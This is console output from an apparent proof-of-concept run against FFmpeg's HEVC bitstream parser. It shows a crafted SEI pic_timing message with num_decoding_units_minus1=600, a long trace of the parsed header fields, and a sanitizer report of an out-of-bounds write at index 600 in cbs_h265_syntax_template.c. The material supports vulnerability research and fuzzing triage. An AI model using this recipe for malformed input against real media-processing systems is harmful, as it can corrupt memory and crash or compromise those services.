[*] Generating crafted HEVC bitstream...
[+] Written 193 bytes to /data/ylwang/non-textfuzz/target/_poc/FFmpeg/libavcodec_cbs_h265_c/vuln_001_input.hevc
    VPS RBSP:  18 bytes
    SPS RBSP:  39 bytes
    PPS RBSP:  5 bytes
    SEI RBSP:  83 bytes  (payload=80 bytes, 601 DU entries)
    IDR stub:  2 bytes  (picture NAL to trigger packet)
    AUD stub:  1 bytes  (flushes previous packet)
[+] SEI pic_timing: num_decoding_units_minus1=600
    Loop writes num_nalus_in_du_minus1[0..600] (601 elements)
    Array bound: HEVC_MAX_SLICE_SEGMENTS=600 (indices 0..599)
    OOB write at index 600 (1 past end of array)

[*] Running FFmpeg with trace_headers BSF (CBS path) to trigger OOB write...
ffmpeg version N-126435-gf93cd72dde Copyright (c) 2000-2026 the FFmpeg developers
  built with gcc 13 (Ubuntu 13.3.0-6ubuntu2~24.04)
  configuration: --cc=gcc --cxx=g++ --extra-cflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-cxxflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-ldflags='-fsanitize=address,undefined' --disable-optimizations --disable-stripping --enable-debug=0 --disable-x86asm --disable-doc
  libavutil      61.  7.100 / 61.  7.100
  libavcodec     63. 11.100 / 63. 11.100
  libavformat    63.  6.100 / 63.  6.100
  libavdevice    63.  2.100 / 63.  2.100
  libavfilter    12.  4.100 / 12.  4.100
  libswscale     10.  2.100 / 10.  2.100
  libswresample   7.  3.100 /  7.  3.100
[hevc @ 0x519000000a80] Unknown slice type: 32.
[hevc @ 0x519000000a80] Unknown slice type: -1.
[trace_headers @ 0x50e000000800] 481         num_nalus_in_du_minus1[410]                                 1 = 0
[trace_headers @ 0x50e000000800] 482         num_nalus_in_du_minus1[411]                                 1 = 0
[trace_headers @ 0x50e000000800] 483         num_nalus_in_du_minus1[412]                                 1 = 0
[trace_headers @ 0x50e000000800] 484         num_nalus_in_du_minus1[413]                                 1 = 0
[trace_headers @ 0x50e000000800] 485         num_nalus_in_du_minus1[414]                                 1 = 0
[trace_headers @ 0x50e000000800] 486         num_nalus_in_du_minus1[415]                                 1 = 0
[trace_headers @ 0x50e000000800] 487         num_nalus_in_du_minus1[416]                                 1 = 0
[trace_headers @ 0x50e000000800] 488         num_nalus_in_du_minus1[417]                                 1 = 0
[trace_headers @ 0x50e000000800] 489         num_nalus_in_du_minus1[418]                                 1 = 0
[trace_headers @ 0x50e000000800] 490         num_nalus_in_du_minus1[419]                                 1 = 0
[trace_headers @ 0x50e000000800] 491         num_nalus_in_du_minus1[420]                                 1 = 0
[trace_headers @ 0x50e000000800] 492         num_nalus_in_du_minus1[421]                                 1 = 0
[trace_headers @ 0x50e000000800] 493         num_nalus_in_du_minus1[422]                                 1 = 0
[trace_headers @ 0x50e000000800] 494         num_nalus_in_du_minus1[423]                                 1 = 0
[trace_headers @ 0x50e000000800] 495         num_nalus_in_du_minus1[424]                                 1 = 0
[trace_headers @ 0x50e000000800] 496         num_nalus_in_du_minus1[425]                                 1 = 0
[trace_headers @ 0x50e000000800] 497         num_nalus_in_du_minus1[426]                                 1 = 0
[trace_headers @ 0x50e000000800] 498         num_nalus_in_du_minus1[427]                                 1 = 0
[trace_headers @ 0x50e000000800] 499         num_nalus_in_du_minus1[428]                                 1 = 0
[trace_headers @ 0x50e000000800] 500         num_nalus_in_du_minus1[429]                                 1 = 0
[trace_headers @ 0x50e000000800] 501         num_nalus_in_du_minus1[430]                                 1 = 0
[trace_headers @ 0x50e000000800] 502         num_nalus_in_du_minus1[431]                                 1 = 0
[trace_headers @ 0x50e000000800] 503         num_nalus_in_du_minus1[432]                                 1 = 0
[trace_headers @ 0x50e000000800] 504         num_nalus_in_du_minus1[433]                                 1 = 0
[trace_headers @ 0x50e000000800] 505         num_nalus_in_du_minus1[434]                                 1 = 0
[trace_headers @ 0x50e000000800] 506         num_nalus_in_du_minus1[435]                                 1 = 0
[trace_headers @ 0x50e000000800] 507         num_nalus_in_du_minus1[436]                                 1 = 0
[trace_headers @ 0x50e000000800] 508         num_nalus_in_du_minus1[437]                                 1 = 0
[trace_headers @ 0x50e000000800] 509         num_nalus_in_du_minus1[438]                                 1 = 0
[trace_headers @ 0x50e000000800] 510         num_nalus_in_du_minus1[439]                                 1 = 0
[trace_headers @ 0x50e000000800] 511         num_nalus_in_du_minus1[440]                                 1 = 0
[trace_headers @ 0x50e000000800] 512         num_nalus_in_du_minus1[441]                                 1 = 0
[trace_headers @ 0x50e000000800] 513         num_nalus_in_du_minus1[442]                                 1 = 0
[trace_headers @ 0x50e000000800] 514         num_nalus_in_du_minus1[443]                                 1 = 0
[trace_headers @ 0x50e000000800] 515         num_nalus_in_du_minus1[444]                                 1 = 0
[trace_headers @ 0x50e000000800] 516         num_nalus_in_du_minus1[445]                                 1 = 0
[trace_headers @ 0x50e000000800] 517         num_nalus_in_du_minus1[446]                                 1 = 0
[trace_headers @ 0x50e000000800] 518         num_nalus_in_du_minus1[447]                                 1 = 0
[trace_headers @ 0x50e000000800] 519         num_nalus_in_du_minus1[448]                                 1 = 0
[trace_headers @ 0x50e000000800] 520         num_nalus_in_du_minus1[449]                                 1 = 0
[trace_headers @ 0x50e000000800] 521         num_nalus_in_du_minus1[450]                                 1 = 0
[trace_headers @ 0x50e000000800] 522         num_nalus_in_du_minus1[451]                                 1 = 0
[trace_headers @ 0x50e000000800] 523         num_nalus_in_du_minus1[452]                                 1 = 0
[trace_headers @ 0x50e000000800] 524         num_nalus_in_du_minus1[453]                                 1 = 0
[trace_headers @ 0x50e000000800] 525         num_nalus_in_du_minus1[454]                                 1 = 0
[trace_headers @ 0x50e000000800] 526         num_nalus_in_du_minus1[455]                                 1 = 0
[trace_headers @ 0x50e000000800] 527         num_nalus_in_du_minus1[456]                                 1 = 0
[trace_headers @ 0x50e000000800] 528         num_nalus_in_du_minus1[457]                                 1 = 0
[trace_headers @ 0x50e000000800] 529         num_nalus_in_du_minus1[458]                                 1 = 0
[trace_headers @ 0x50e000000800] 530         num_nalus_in_du_minus1[459]                                 1 = 0
[trace_headers @ 0x50e000000800] 531         num_nalus_in_du_minus1[460]                                 1 = 0
[trace_headers @ 0x50e000000800] 532         num_nalus_in_du_minus1[461]                                 1 = 0
[trace_headers @ 0x50e000000800] 533         num_nalus_in_du_minus1[462]                                 1 = 0
[trace_headers @ 0x50e000000800] 534         num_nalus_in_du_minus1[463]                                 1 = 0
[trace_headers @ 0x50e000000800] 535         num_nalus_in_du_minus1[464]                                 1 = 0
[trace_headers @ 0x50e000000800] 536         num_nalus_in_du_minus1[465]                                 1 = 0
[trace_headers @ 0x50e000000800] 537         num_nalus_in_du_minus1[466]                                 1 = 0
[trace_headers @ 0x50e000000800] 538         num_nalus_in_du_minus1[467]                                 1 = 0
[trace_headers @ 0x50e000000800] 539         num_nalus_in_du_minus1[468]                                 1 = 0
[trace_headers @ 0x50e000000800] 540         num_nalus_in_du_minus1[469]                                 1 = 0
[trace_headers @ 0x50e000000800] 541         num_nalus_in_du_minus1[470]                                 1 = 0
[trace_headers @ 0x50e000000800] 542         num_nalus_in_du_minus1[471]                                 1 = 0
[trace_headers @ 0x50e000000800] 543         num_nalus_in_du_minus1[472]                                 1 = 0
[trace_headers @ 0x50e000000800] 544         num_nalus_in_du_minus1[473]                                 1 = 0
[trace_headers @ 0x50e000000800] 545         num_nalus_in_du_minus1[474]                                 1 = 0
[trace_headers @ 0x50e000000800] 546         num_nalus_in_du_minus1[475]                                 1 = 0
[trace_headers @ 0x50e000000800] 547         num_nalus_in_du_minus1[476]                                 1 = 0
[trace_headers @ 0x50e000000800] 548         num_nalus_in_du_minus1[477]                                 1 = 0
[trace_headers @ 0x50e000000800] 549         num_nalus_in_du_minus1[478]                                 1 = 0
[trace_headers @ 0x50e000000800] 550         num_nalus_in_du_minus1[479]                                 1 = 0
[trace_headers @ 0x50e000000800] 551         num_nalus_in_du_minus1[480]                                 1 = 0
[trace_headers @ 0x50e000000800] 552         num_nalus_in_du_minus1[481]                                 1 = 0
[trace_headers @ 0x50e000000800] 553         num_nalus_in_du_minus1[482]                                 1 = 0
[trace_headers @ 0x50e000000800] 554         num_nalus_in_du_minus1[483]                                 1 = 0
[trace_headers @ 0x50e000000800] 555         num_nalus_in_du_minus1[484]                                 1 = 0
[trace_headers @ 0x50e000000800] 556         num_nalus_in_du_minus1[485]                                 1 = 0
[trace_headers @ 0x50e000000800] 557         num_nalus_in_du_minus1[486]                                 1 = 0
[trace_headers @ 0x50e000000800] 558         num_nalus_in_du_minus1[487]                                 1 = 0
[trace_headers @ 0x50e000000800] 559         num_nalus_in_du_minus1[488]                                 1 = 0
[trace_headers @ 0x50e000000800] 560         num_nalus_in_du_minus1[489]                                 1 = 0
[trace_headers @ 0x50e000000800] 561         num_nalus_in_du_minus1[490]                                 1 = 0
[trace_headers @ 0x50e000000800] 562         num_nalus_in_du_minus1[491]                                 1 = 0
[trace_headers @ 0x50e000000800] 563         num_nalus_in_du_minus1[492]                                 1 = 0
[trace_headers @ 0x50e000000800] 564         num_nalus_in_du_minus1[493]                                 1 = 0
[trace_headers @ 0x50e000000800] 565         num_nalus_in_du_minus1[494]                                 1 = 0
[trace_headers @ 0x50e000000800] 566         num_nalus_in_du_minus1[495]                                 1 = 0
[trace_headers @ 0x50e000000800] 567         num_nalus_in_du_minus1[496]                                 1 = 0
[trace_headers @ 0x50e000000800] 568         num_nalus_in_du_minus1[497]                                 1 = 0
[trace_headers @ 0x50e000000800] 569         num_nalus_in_du_minus1[498]                                 1 = 0
[trace_headers @ 0x50e000000800] 570         num_nalus_in_du_minus1[499]                                 1 = 0
[trace_headers @ 0x50e000000800] 571         num_nalus_in_du_minus1[500]                                 1 = 0
[trace_headers @ 0x50e000000800] 572         num_nalus_in_du_minus1[501]                                 1 = 0
[trace_headers @ 0x50e000000800] 573         num_nalus_in_du_minus1[502]                                 1 = 0
[trace_headers @ 0x50e000000800] 574         num_nalus_in_du_minus1[503]                                 1 = 0
[trace_headers @ 0x50e000000800] 575         num_nalus_in_du_minus1[504]                                 1 = 0
[trace_headers @ 0x50e000000800] 576         num_nalus_in_du_minus1[505]                                 1 = 0
[trace_headers @ 0x50e000000800] 577         num_nalus_in_du_minus1[506]                                 1 = 0
[trace_headers @ 0x50e000000800] 578         num_nalus_in_du_minus1[507]                                 1 = 0
[trace_headers @ 0x50e000000800] 579         num_nalus_in_du_minus1[508]                                 1 = 0
[trace_headers @ 0x50e000000800] 580         num_nalus_in_du_minus1[509]                                 1 = 0
[trace_headers @ 0x50e000000800] 581         num_nalus_in_du_minus1[510]                                 1 = 0
[trace_headers @ 0x50e000000800] 582         num_nalus_in_du_minus1[511]                                 1 = 0
[trace_headers @ 0x50e000000800] 583         num_nalus_in_du_minus1[512]                                 1 = 0
[trace_headers @ 0x50e000000800] 584         num_nalus_in_du_minus1[513]                                 1 = 0
[trace_headers @ 0x50e000000800] 585         num_nalus_in_du_minus1[514]                                 1 = 0
[trace_headers @ 0x50e000000800] 586         num_nalus_in_du_minus1[515]                                 1 = 0
[trace_headers @ 0x50e000000800] 587         num_nalus_in_du_minus1[516]                                 1 = 0
[trace_headers @ 0x50e000000800] 588         num_nalus_in_du_minus1[517]                                 1 = 0
[trace_headers @ 0x50e000000800] 589         num_nalus_in_du_minus1[518]                                 1 = 0
[trace_headers @ 0x50e000000800] 590         num_nalus_in_du_minus1[519]                                 1 = 0
[trace_headers @ 0x50e000000800] 591         num_nalus_in_du_minus1[520]                                 1 = 0
[trace_headers @ 0x50e000000800] 592         num_nalus_in_du_minus1[521]                                 1 = 0
[trace_headers @ 0x50e000000800] 593         num_nalus_in_du_minus1[522]                                 1 = 0
[trace_headers @ 0x50e000000800] 594         num_nalus_in_du_minus1[523]                                 1 = 0
[trace_headers @ 0x50e000000800] 595         num_nalus_in_du_minus1[524]                                 1 = 0
[trace_headers @ 0x50e000000800] 596         num_nalus_in_du_minus1[525]                                 1 = 0
[trace_headers @ 0x50e000000800] 597         num_nalus_in_du_minus1[526]                                 1 = 0
[trace_headers @ 0x50e000000800] 598         num_nalus_in_du_minus1[527]                                 1 = 0
[trace_headers @ 0x50e000000800] 599         num_nalus_in_du_minus1[528]                                 1 = 0
[trace_headers @ 0x50e000000800] 600         num_nalus_in_du_minus1[529]                                 1 = 0
[trace_headers @ 0x50e000000800] 601         num_nalus_in_du_minus1[530]                                 1 = 0
[trace_headers @ 0x50e000000800] 602         num_nalus_in_du_minus1[531]                                 1 = 0
[trace_headers @ 0x50e000000800] 603         num_nalus_in_du_minus1[532]                                 1 = 0
[trace_headers @ 0x50e000000800] 604         num_nalus_in_du_minus1[533]                                 1 = 0
[trace_headers @ 0x50e000000800] 605         num_nalus_in_du_minus1[534]                                 1 = 0
[trace_headers @ 0x50e000000800] 606         num_nalus_in_du_minus1[535]                                 1 = 0
[trace_headers @ 0x50e000000800] 607         num_nalus_in_du_minus1[536]                                 1 = 0
[trace_headers @ 0x50e000000800] 608         num_nalus_in_du_minus1[537]                                 1 = 0
[trace_headers @ 0x50e000000800] 609         num_nalus_in_du_minus1[538]                                 1 = 0
[trace_headers @ 0x50e000000800] 610         num_nalus_in_du_minus1[539]                                 1 = 0
[trace_headers @ 0x50e000000800] 611         num_nalus_in_du_minus1[540]                                 1 = 0
[trace_headers @ 0x50e000000800] 612         num_nalus_in_du_minus1[541]                                 1 = 0
[trace_headers @ 0x50e000000800] 613         num_nalus_in_du_minus1[542]                                 1 = 0
[trace_headers @ 0x50e000000800] 614         num_nalus_in_du_minus1[543]                                 1 = 0
[trace_headers @ 0x50e000000800] 615         num_nalus_in_du_minus1[544]                                 1 = 0
[trace_headers @ 0x50e000000800] 616         num_nalus_in_du_minus1[545]                                 1 = 0
[trace_headers @ 0x50e000000800] 617         num_nalus_in_du_minus1[546]                                 1 = 0
[trace_headers @ 0x50e000000800] 618         num_nalus_in_du_minus1[547]                                 1 = 0
[trace_headers @ 0x50e000000800] 619         num_nalus_in_du_minus1[548]                                 1 = 0
[trace_headers @ 0x50e000000800] 620         num_nalus_in_du_minus1[549]                                 1 = 0
[trace_headers @ 0x50e000000800] 621         num_nalus_in_du_minus1[550]                                 1 = 0
[trace_headers @ 0x50e000000800] 622         num_nalus_in_du_minus1[551]                                 1 = 0
[trace_headers @ 0x50e000000800] 623         num_nalus_in_du_minus1[552]                                 1 = 0
[trace_headers @ 0x50e000000800] 624         num_nalus_in_du_minus1[553]                                 1 = 0
[trace_headers @ 0x50e000000800] 625         num_nalus_in_du_minus1[554]                                 1 = 0
[trace_headers @ 0x50e000000800] 626         num_nalus_in_du_minus1[555]                                 1 = 0
[trace_headers @ 0x50e000000800] 627         num_nalus_in_du_minus1[556]                                 1 = 0
[trace_headers @ 0x50e000000800] 628         num_nalus_in_du_minus1[557]                                 1 = 0
[trace_headers @ 0x50e000000800] 629         num_nalus_in_du_minus1[558]                                 1 = 0
[trace_headers @ 0x50e000000800] 630         num_nalus_in_du_minus1[559]                                 1 = 0
[trace_headers @ 0x50e000000800] 631         num_nalus_in_du_minus1[560]                                 1 = 0
[trace_headers @ 0x50e000000800] 632         num_nalus_in_du_minus1[561]                                 1 = 0
[trace_headers @ 0x50e000000800] 633         num_nalus_in_du_minus1[562]                                 1 = 0
[trace_headers @ 0x50e000000800] 634         num_nalus_in_du_minus1[563]                                 1 = 0
[trace_headers @ 0x50e000000800] 635         num_nalus_in_du_minus1[564]                                 1 = 0
[trace_headers @ 0x50e000000800] 636         num_nalus_in_du_minus1[565]                                 1 = 0
[trace_headers @ 0x50e000000800] 637         num_nalus_in_du_minus1[566]                                 1 = 0
[trace_headers @ 0x50e000000800] 638         num_nalus_in_du_minus1[567]                                 1 = 0
[trace_headers @ 0x50e000000800] 639         num_nalus_in_du_minus1[568]                                 1 = 0
[trace_headers @ 0x50e000000800] 640         num_nalus_in_du_minus1[569]                                 1 = 0
[trace_headers @ 0x50e000000800] 641         num_nalus_in_du_minus1[570]                                 1 = 0
[trace_headers @ 0x50e000000800] 642         num_nalus_in_du_minus1[571]                                 1 = 0
[trace_headers @ 0x50e000000800] 643         num_nalus_in_du_minus1[572]                                 1 = 0
[trace_headers @ 0x50e000000800] 644         num_nalus_in_du_minus1[573]                                 1 = 0
[trace_headers @ 0x50e000000800] 645         num_nalus_in_du_minus1[574]                                 1 = 0
[trace_headers @ 0x50e000000800] 646         num_nalus_in_du_minus1[575]                                 1 = 0
[trace_headers @ 0x50e000000800] 647         num_nalus_in_du_minus1[576]                                 1 = 0
[trace_headers @ 0x50e000000800] 648         num_nalus_in_du_minus1[577]                                 1 = 0
[trace_headers @ 0x50e000000800] 649         num_nalus_in_du_minus1[578]                                 1 = 0
[trace_headers @ 0x50e000000800] 650         num_nalus_in_du_minus1[579]                                 1 = 0
[trace_headers @ 0x50e000000800] 651         num_nalus_in_du_minus1[580]                                 1 = 0
[trace_headers @ 0x50e000000800] 652         num_nalus_in_du_minus1[581]                                 1 = 0
[trace_headers @ 0x50e000000800] 653         num_nalus_in_du_minus1[582]                                 1 = 0
[trace_headers @ 0x50e000000800] 654         num_nalus_in_du_minus1[583]                                 1 = 0
[trace_headers @ 0x50e000000800] 655         num_nalus_in_du_minus1[584]                                 1 = 0
[trace_headers @ 0x50e000000800] 656         num_nalus_in_du_minus1[585]                                 1 = 0
[trace_headers @ 0x50e000000800] 657         num_nalus_in_du_minus1[586]                                 1 = 0
[trace_headers @ 0x50e000000800] 658         num_nalus_in_du_minus1[587]                                 1 = 0
[trace_headers @ 0x50e000000800] 659         num_nalus_in_du_minus1[588]                                 1 = 0
[trace_headers @ 0x50e000000800] 660         num_nalus_in_du_minus1[589]                                 1 = 0
[trace_headers @ 0x50e000000800] 661         num_nalus_in_du_minus1[590]                                 1 = 0
[trace_headers @ 0x50e000000800] 662         num_nalus_in_du_minus1[591]                                 1 = 0
[trace_headers @ 0x50e000000800] 663         num_nalus_in_du_minus1[592]                                 1 = 0
[trace_headers @ 0x50e000000800] 664         num_nalus_in_du_minus1[593]                                 1 = 0
[trace_headers @ 0x50e000000800] 665         num_nalus_in_du_minus1[594]                                 1 = 0
[trace_headers @ 0x50e000000800] 666         num_nalus_in_du_minus1[595]                                 1 = 0
[trace_headers @ 0x50e000000800] 667         num_nalus_in_du_minus1[596]                                 1 = 0
[trace_headers @ 0x50e000000800] 668         num_nalus_in_du_minus1[597]                                 1 = 0
[trace_headers @ 0x50e000000800] 669         num_nalus_in_du_minus1[598]                                 1 = 0
[trace_headers @ 0x50e000000800] 670         num_nalus_in_du_minus1[599]                                 1 = 0
[trace_headers @ 0x50e000000800] 671         num_nalus_in_du_minus1[600]                                 1 = 0
src/libavcodec/cbs_h265_syntax_template.c:2005:17: runtime error: index 600 out of bounds for type 'uint16_t [600]'
[trace_headers @ 0x50e000000800] 672         rbsp_stop_one_bit                                           1 = 1
[trace_headers @ 0x50e000000800] 673         rbsp_alignment_zero_bit                                     0 = 0
[trace_headers @ 0x50e000000800] 674         rbsp_alignment_zero_bit                                     0 = 0
[trace_headers @ 0x50e000000800] 675         rbsp_alignment_zero_bit                                     0 = 0
[trace_headers @ 0x50e000000800] 676         rbsp_alignment_zero_bit                                     0 = 0
[trace_headers @ 0x50e000000800] 677         rbsp_alignment_zero_bit                                     0 = 0
[trace_headers @ 0x50e000000800] 678         rbsp_alignment_zero_bit                                     0 = 0
[trace_headers @ 0x50e000000800] 679         rbsp_alignment_zero_bit                                     0 = 0
[trace_headers @ 0x50e000000800] Slice Segment Header
[trace_headers @ 0x50e000000800] 0           forbidden_zero_bit                                          0 = 0
[trace_headers @ 0x50e000000800] 1           nal_unit_type                                          010011 = 19
[trace_headers @ 0x50e000000800] 7           nuh_layer_id                                           000000 = 0
[trace_headers @ 0x50e000000800] 13          nuh_temporal_id_plus1                                     001 = 1
[trace_headers @ 0x50e000000800] 16          first_slice_segment_in_pic_flag                             1 = 1
[trace_headers @ 0x50e000000800] 17          no_output_of_prior_pics_flag                                0 = 0
[trace_headers @ 0x50e000000800] 18          slice_pic_parameter_set_id                                  1 = 0
[trace_headers @ 0x50e000000800] Invalid ue-golomb code at slice_type: bitstream ended.
[trace_headers @ 0x50e000000800] Failed to read unit 4 (type 19): Invalid data found when processing input.
[vost#0:0/copy @ 0x517000000780] Error applying bitstream filters to a packet: Invalid data found when processing inputPacket: 7 bytes, no pts, dts 40000, duration 40000.
[trace_headers @ 0x50e000000800] Access Unit Delimiter
[trace_headers @ 0x50e000000800] 0           forbidden_zero_bit                                          0 = 0
[trace_headers @ 0x50e000000800] 1           nal_unit_type                                          100011 = 35
[trace_headers @ 0x50e000000800] 7           nuh_layer_id                                           000000 = 0
[trace_headers @ 0x50e000000800] 13          nuh_temporal_id_plus1                                     001 = 1
[trace_headers @ 0x50e000000800] 16          pic_type                                                  000 = 0
[trace_headers @ 0x50e000000800] 19          rbsp_stop_one_bit                                           1 = 1
[trace_headers @ 0x50e000000800] 20          rbsp_alignment_zero_bit                                     0 = 0
[trace_headers @ 0x50e000000800] 21          rbsp_alignment_zero_bit                                     0 = 0
[trace_headers @ 0x50e000000800] 22          rbsp_alignment_zero_bit                                     0 = 0
[trace_headers @ 0x50e000000800] 23          rbsp_alignment_zero_bit                                     0 = 0
[out#0/null @ 0x511000002200] video:0KiB audio:0KiB subtitle:0KiB other streams:0KiB global headers:0KiB muxing overhead: unknown
frame=    1 fps=0.0 q=-1.0 Lsize=N/A time=N/A bitrate=N/A speed=N/A elapsed=0:00:00.00    

[*] No ASAN crash log (asan.log.*) found

[*] Checking for vulnerability evidence...
[!] VULNERABILITY CONFIRMED: OOB write detected!
src/libavcodec/cbs_h265_syntax_template.c:2005:17: runtime error: index 600 out of bounds for type 'uint16_t [600]'

[*] Done.
EXIT=0
